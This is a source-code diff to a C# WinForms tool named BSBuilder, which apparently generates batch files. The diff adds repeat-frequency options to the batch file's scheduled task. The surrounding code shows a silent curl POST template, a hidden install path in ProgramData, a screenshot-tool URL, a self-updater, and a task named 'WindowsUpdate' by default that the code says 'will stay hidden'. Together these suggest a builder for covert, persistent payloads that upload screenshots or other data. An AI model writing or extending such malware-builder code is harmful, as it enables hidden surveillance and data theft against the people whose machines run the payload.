@@ -65,6 +65,8 @@ namespace BSBuilder
         string curlmessage0 = "curl --silent --output /dev/null -i -H \"Accept: application/json\" -H \"Content-Type:application/json\" -X POST --data \"{\\\"content\\\": \\\"";
         string curlmessage1 = "\\\"}\"";
 
+        decimal scheduleFreq = Properties.Settings.Default.scheduleFrequency;
+
         public Form1()
         {
             InitializeComponent();
@@ -101,6 +103,7 @@ namespace BSBuilder
             hidepathtextbox.Text = Properties.Settings.Default.hidepath;
             sstooltextbox.Text = Properties.Settings.Default.screenshottoolurl;
             whenscheduledtextbox.Text = Properties.Settings.Default.whenscheduled;
+            scheduleFrequency.Value = Properties.Settings.Default.scheduleFrequency;
             schedulenametextbox.Text = Properties.Settings.Default.schedulename;
             batchcopynametextbox.Text = Properties.Settings.Default.batchcopyname;
             batchupdaternametextbox.Text = Properties.Settings.Default.batchupdatername;
@@ -362,7 +365,9 @@ namespace BSBuilder
 
                         if (hidepath.Length != 0)
                             editVAR("set \"vpath=C:\\ProgramData\"", "vpath", hidepath);
-                        if (whenscheduled.Length != 0)
+                        if (whenscheduled.Length != 0 && scheduleFreq != 0)
+                            editVAR("set \"when=Daily\"", "when", whenscheduled + " " + freq_arg + " " + scheduleFreq);
+                        else
                             editVAR("set \"when=Daily\"", "when", whenscheduled);
                         if (schedulename.Length != 0)
                             editVAR("set \"ScheduleName=WindowsUpdate\"", "ScheduleName", schedulename);
@@ -606,21 +611,80 @@ namespace BSBuilder
             batchfetchURL = fetchurl.Text;
         }
 
+        string freq_arg = "/mo";
+
         private void whenscheduledtextbox_SelectedIndexChanged(object sender, EventArgs e)
         {
-            if (whenscheduledtextbox.Text == "Onlogon")
-            {
-                if (startadmin)
-                    whenscheduled = whenscheduledtextbox.Text;
-                else
-                {
-                    MessageBox.Show("Please enable 'Start as Administrator' before changing this to '" + whenscheduledtextbox.Text + "'. Otherwise the batch file won't be scheduled.\n\nYour batch file will not ask for administrator when started by the scheduler. It will stay hidden.", "Incorrect settings");
-                    whenscheduledtextbox.Text = "Daily";
-                }
+            whenscheduled = whenscheduledtextbox.Text;
 
+            switch (whenscheduledtextbox.Text)
+            {
+                case "Minute":
+                    freqlabel.Text = "Every (1 - 1439 minutes)";
+                    scheduleFrequency.Maximum = 1439;
+                    scheduleFrequency.Value = 0;
+                    freq_arg = "/mo";
+                    break;
+
+                case "Hourly":
+                    freqlabel.Text = "Every (1 - 23 hours)";
+                    scheduleFrequency.Maximum = 23;
+                    scheduleFrequency.Value = 0;
+                    freq_arg = "/mo";
+                    break;
+
+                case "Daily":
+                    freqlabel.Text = "Every (1 - 365 days)";
+                    scheduleFrequency.Maximum = 365;
+                    scheduleFrequency.Value = 0;
+                    freq_arg = "/mo";
+                    break;
+
+                case "Weekly":
+                    freqlabel.Text = "Every (1 - 52 weeks)";
+                    scheduleFrequency.Maximum = 52;
+                    scheduleFrequency.Value = 0;
+                    freq_arg = "/mo";
+                    break;
+
+                case "Monthly":
+                    freqlabel.Text = "1st - 12th month)";
+                    scheduleFrequency.Maximum = 12;
+                    scheduleFrequency.Value = 0;
+                    freq_arg = "/mo";
+                    break;
+
+                case "Onlogon":
+                    freqlabel.Text = "Frequency (None)";
+                    scheduleFrequency.Maximum = 0;
+                    scheduleFrequency.Value = 0;
+                    freq_arg = "";
+                    if (!startadmin)
+                    {
+                        MessageBox.Show("Please enable 'Start as Administrator' before changing this to '" + whenscheduledtextbox.Text + "'. Otherwise the batch file won't be scheduled.\n\nYour batch file will not ask for administrator when started by the scheduler. It will stay hidden.", "Incorrect settings");
+                        whenscheduledtextbox.Text = "Daily";
+                    }
+                    break;
+
+                case "Once":
+                    freqlabel.Text = "Frequency (None)";
+                    scheduleFrequency.Maximum = 0;
+                    scheduleFrequency.Value = 0;
+                    freq_arg = "";
+                    break;
+
+                case "Onidle":
+                    freqlabel.Text = "After idle (1 - 1439 minutes)";
+                    scheduleFrequency.Maximum = 1439;
+                    scheduleFrequency.Value = 0;
+                    freq_arg = "/i";
+                    break;
             }
-            else
-                whenscheduled = whenscheduledtextbox.Text;
+        }
+
+        private void scheduleFrequency_ValueChanged(object sender, EventArgs e)
+        {
+            scheduleFreq = scheduleFrequency.Value;
         }
 
         private void acceptTOScheckbox_CheckedChanged(object sender, EventArgs e)
@@ -990,6 +1054,7 @@ namespace BSBuilder
             Properties.Settings.Default.screenshottoolurl = screenshottoolurl;
             Properties.Settings.Default.hidepath = hidepath;
             Properties.Settings.Default.whenscheduled = whenscheduled;
+            Properties.Settings.Default.scheduleFrequency = scheduleFreq;
             Properties.Settings.Default.schedulename = schedulename;
             Properties.Settings.Default.batchcopyname = batchcopyname;
             Properties.Settings.Default.batchupdatername = batchupdatername;
